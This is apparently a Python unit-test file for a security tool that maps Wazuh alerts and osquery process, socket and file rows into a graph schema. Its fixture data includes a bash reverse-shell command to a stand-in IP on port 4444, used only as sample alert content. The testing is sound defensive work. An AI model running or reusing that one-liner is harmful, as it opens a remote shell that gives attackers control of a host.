"""Tests for user, parent process, network and files mapping in event_mapper.

The rules come from the graph engineer's ingest schema:
- user only with a real username, never an "admin" flag
- network needs dest_ip, dest_port AND protocol, only for the matched process
- files need a pid-bearing row and op read/write only
- parent needs only a pid
"""
import copy
import json
import unittest

from event_mapper import map_events, map_wazuh_alert

CMD = "bash -i >& /dev/tcp/10.0.0.99/4444 0>&1"
ALERT_TS = "2026-10-02T08:30:05.780+0000"  # 1790929805 s
ALERT_SEC = 1790929805


def wazuh_alert(**extra_data):
    data = {"win": {"eventdata": {"commandLine": CMD}}}
    data.update(extra_data)
    return {
        "timestamp": ALERT_TS,
        "rule": {"level": 12, "description": "Reverse shell", "id": "100201"},
        "agent": {"id": "001", "name": "prod-web-01", "ip": "192.168.10.15"},
        "data": data,
    }


def proc_row(pid="4312", parent="4000", host="prod-web-01", t=ALERT_SEC + 5):
    cols = {"pid": pid, "name": "bash", "path": "/bin/bash", "cmdline": CMD}
    if parent is not None:
        cols["parent"] = parent
    return {"name": "pack_process_events", "hostIdentifier": host, "unixTime": t,
            "action": "added", "columns": cols}


def sock_row(pid="4312", remote="10.0.0.99", rport="4444", proto="6", local="192.168.10.15",
             host="prod-web-01", t=ALERT_SEC + 6, action="added"):
    return {"name": "pack_process_open_sockets", "hostIdentifier": host, "unixTime": t,
            "action": action,
            "columns": {"pid": pid, "local_address": local, "local_port": "50000",
                        "remote_address": remote, "remote_port": rport, "protocol": proto}}


def file_row(pid="4312", action="CREATED", path="/tmp/x.sh", host="prod-web-01", t=ALERT_SEC + 7):
    cols = {"action": action, "target_path": path}
    if pid is not None:
        cols["pid"] = pid
    return {"name": "pack_file_events", "hostIdentifier": host, "unixTime": t,
            "action": "added", "columns": cols}


def map_one(wazuh, osquery):
    status, event, _third = map_wazuh_alert(copy.deepcopy(wazuh), copy.deepcopy(osquery))
    assert status == "mapped", status
    return event


class TestUser(unittest.TestCase):
    def test_domain_user_is_split(self):
        ev = map_one(wazuh_alert(win={"eventdata": {"commandLine": CMD, "user": "CORP\\alice"}}), [])
        self.assertEqual(ev["user"], {"username": "alice", "domain": "CORP"})

    def test_plain_user_from_eventdata(self):
        ev = map_one(wazuh_alert(win={"eventdata": {"commandLine": CMD, "user": "alice"}}), [])
        self.assertEqual(ev["user"], {"username": "alice"})

    def test_dstuser(self):
        ev = map_one(wazuh_alert(dstuser="root"), [])
        self.assertEqual(ev["user"], {"username": "root"})

    def test_eventdata_user_wins_over_dstuser(self):
        ev = map_one(wazuh_alert(win={"eventdata": {"commandLine": CMD, "user": "alice"}}, dstuser="root"), [])
        self.assertEqual(ev["user"]["username"], "alice")

    def test_no_user_without_a_username(self):
        for bad in (None, "", "   ", 123, ["x"], {"a": 1}, "CORP\\", "\\"):
            ev = map_one(wazuh_alert(dstuser=bad), [])
            self.assertNotIn("user", ev, bad)

    def test_admin_flag_is_never_sent(self):
        ev = map_one(wazuh_alert(dstuser="root"), [])
        self.assertNotIn("admin", ev["user"])

    def test_alert_without_user_has_no_user_key(self):
        ev = map_one(wazuh_alert(), [])
        self.assertNotIn("user", ev)


class TestParent(unittest.TestCase):
    def test_parent_pid_is_attached_with_the_process(self):
        ev = map_one(wazuh_alert(), [proc_row()])
        self.assertEqual(ev["process"]["parent"], {"pid": 4000})

    def test_parent_missing_or_bad_is_left_out(self):
        for bad in (None, "0", "-1", "abc", "", 0):
            row = proc_row(parent=bad)
            ev = map_one(wazuh_alert(), [row])
            self.assertIn("process", ev)
            self.assertNotIn("parent", ev["process"], bad)

    def test_parent_has_only_a_pid(self):
        ev = map_one(wazuh_alert(), [proc_row()])
        self.assertEqual(list(ev["process"]["parent"].keys()), ["pid"])

    def test_no_process_means_no_parent(self):
        ev = map_one(wazuh_alert(), [])
        self.assertNotIn("process", ev)


class TestNetwork(unittest.TestCase):
    def test_socket_rows_of_the_matched_pid_are_mapped(self):
        ev = map_one(wazuh_alert(), [proc_row(), sock_row(), sock_row(remote="10.0.0.5", rport="53", proto="17")])
        self.assertEqual(ev["network"], [
            {"dest_ip": "10.0.0.99", "dest_port": 4444, "protocol": "TCP", "src_ip": "192.168.10.15"},
            {"dest_ip": "10.0.0.5", "dest_port": 53, "protocol": "UDP", "src_ip": "192.168.10.15"},
        ])

    def test_no_network_without_a_matched_process(self):
        ev = map_one(wazuh_alert(), [sock_row()])
        self.assertNotIn("network", ev)
        self.assertNotIn("process", ev)

    def test_bad_rows_are_skipped(self):
        rows = [proc_row(),
                sock_row(remote=""), sock_row(remote=None), sock_row(rport="0"), sock_row(rport="abc"),
                sock_row(rport="70000"), sock_row(proto="1"), sock_row(proto=None),
                sock_row(pid="9999"), sock_row(host="other-host"), sock_row(action="removed"),
                sock_row(t=ALERT_SEC + 5000)]
        ev = map_one(wazuh_alert(), rows)
        self.assertNotIn("network", ev)

    def test_row_without_local_address_has_no_src_ip(self):
        ev = map_one(wazuh_alert(), [proc_row(), sock_row(local="")])
        self.assertEqual(ev["network"], [{"dest_ip": "10.0.0.99", "dest_port": 4444, "protocol": "TCP"}])

    def test_duplicates_are_removed_and_order_is_kept(self):
        ev = map_one(wazuh_alert(), [proc_row(), sock_row(rport="2"), sock_row(rport="1"), sock_row(rport="2")])
        self.assertEqual([n["dest_port"] for n in ev["network"]], [2, 1])

    def test_network_is_capped(self):
        rows = [proc_row()] + [sock_row(rport=str(1000 + i)) for i in range(300)]
        ev = map_one(wazuh_alert(), rows)
        self.assertEqual(len(ev["network"]), 100)

    def test_fqdn_and_case_differences_still_match(self):
        ev = map_one(wazuh_alert(), [proc_row(host="PROD-WEB-01.corp.example.com"),
                                     sock_row(host="PROD-WEB-01.corp.example.com")])
        self.assertEqual(len(ev["network"]), 1)

    def test_every_network_entry_has_the_required_keys(self):
        ev = map_one(wazuh_alert(), [proc_row(), sock_row()])
        for n in ev["network"]:
            self.assertTrue({"dest_ip", "dest_port", "protocol"} <= set(n))
            self.assertIsInstance(n["dest_port"], int)
            self.assertIn(n["protocol"], ("TCP", "UDP"))


class TestFiles(unittest.TestCase):
    def test_actions_map_to_read_and_write(self):
        rows = [proc_row(),
                file_row(action="CREATED", path="/a"), file_row(action="UPDATED", path="/b"),
                file_row(action="MOVED_TO", path="/c"), file_row(action="ACCESSED", path="/d"),
                file_row(action="OPENED", path="/e")]
        ev = map_one(wazuh_alert(), rows)
        self.assertEqual(ev["files"], [
            {"path": "/a", "op": "write"}, {"path": "/b", "op": "write"}, {"path": "/c", "op": "write"},
            {"path": "/d", "op": "read"}, {"path": "/e", "op": "read"}])

    def test_deletes_and_unknown_actions_are_skipped(self):
        rows = [proc_row(), file_row(action="DELETED"), file_row(action="MOVED_FROM"),
                file_row(action="ATTRIBUTES_MODIFIED"), file_row(action=None), file_row(action=5)]
        ev = map_one(wazuh_alert(), rows)
        self.assertNotIn("files", ev)

    def test_no_pid_no_file_entry(self):
        ev = map_one(wazuh_alert(), [proc_row(), file_row(pid=None)])
        self.assertNotIn("files", ev)

    def test_other_pid_other_host_or_old_rows_are_skipped(self):
        rows = [proc_row(), file_row(pid="1"), file_row(host="other"), file_row(t=ALERT_SEC + 5000)]
        ev = map_one(wazuh_alert(), rows)
        self.assertNotIn("files", ev)

    def test_process_rows_without_a_file_action_are_not_files(self):
        ev = map_one(wazuh_alert(), [proc_row()])
        self.assertNotIn("files", ev)

    def test_path_must_be_a_string(self):
        row = file_row()
        row["columns"]["target_path"] = 123
        ev = map_one(wazuh_alert(), [proc_row(), row])
        self.assertNotIn("files", ev)

    def test_no_files_without_a_matched_process(self):
        ev = map_one(wazuh_alert(), [file_row()])
        self.assertNotIn("files", ev)


ALLOWED = {
    "alert": {"id", "timestamp", "level", "name", "mitre"},
    "host": {"hostname", "ip", "os"},
    "user": {"username", "domain"},
    "process": {"pid", "name", "args", "parent"},
    "parent": {"pid"},
    "network": {"dest_ip", "dest_port", "protocol", "src_ip"},
    "files": {"path", "op"},
}


class TestWholeEvent(unittest.TestCase):
    def full_event(self):
        wazuh = wazuh_alert(win={"eventdata": {"commandLine": CMD, "user": "CORP\\alice"}})
        osq = [proc_row(), sock_row(), file_row()]
        return map_one(wazuh, osq)

    def test_event_uses_only_schema_keys(self):
        ev = self.full_event()
        self.assertTrue(set(ev) <= {"alert", "host", "user", "process", "network", "files"})
        for key in ("alert", "host", "user"):
            self.assertTrue(set(ev[key]) <= ALLOWED[key], key)
        self.assertTrue(set(ev["process"]) <= ALLOWED["process"])
        self.assertTrue(set(ev["process"]["parent"]) <= ALLOWED["parent"])
        for n in ev["network"]:
            self.assertTrue(set(n) <= ALLOWED["network"])
        for f in ev["files"]:
            self.assertTrue(set(f) <= ALLOWED["files"])
            self.assertIn(f["op"], ("read", "write"))

    def test_full_event_is_json_serializable(self):
        json.dumps(self.full_event())

    def test_inputs_are_not_changed(self):
        wazuh = [wazuh_alert(dstuser="root")]
        osq = [proc_row(), sock_row(), file_row()]
        w_copy, o_copy = copy.deepcopy(wazuh), copy.deepcopy(osq)
        res = map_events(wazuh, osq)
        self.assertEqual(len(res["events"]), 1)
        self.assertEqual(wazuh, w_copy)
        self.assertEqual(osq, o_copy)

    def test_attach_log_does_not_contain_the_command(self):
        with self.assertLogs("event_mapper", level="INFO") as cm:
            map_events([wazuh_alert()], [proc_row()])
        attach = [line for line in cm.output if "Attached process" in line]
        self.assertEqual(len(attach), 1)
        self.assertNotIn("/dev/tcp", attach[0])
        self.assertNotIn("bash -i", attach[0])
        self.assertIn("pid=4312", attach[0])

    def test_ambiguous_process_gets_no_process_network_or_files(self):
        osq = [proc_row(pid="1"), proc_row(pid="2"), sock_row(pid="1"), file_row(pid="2")]
        ev = map_one(wazuh_alert(), osq)
        self.assertNotIn("process", ev)
        self.assertNotIn("network", ev)
        self.assertNotIn("files", ev)

    def test_return_shape_is_unchanged(self):
        res = map_events([wazuh_alert()], [proc_row()])
        self.assertEqual(set(res), {"events", "noise_dropped", "invalid", "attached"})
        self.assertEqual(set(res["attached"][0]), {"alert_id", "host", "pid", "command"})


if __name__ == "__main__":
    unittest.main()
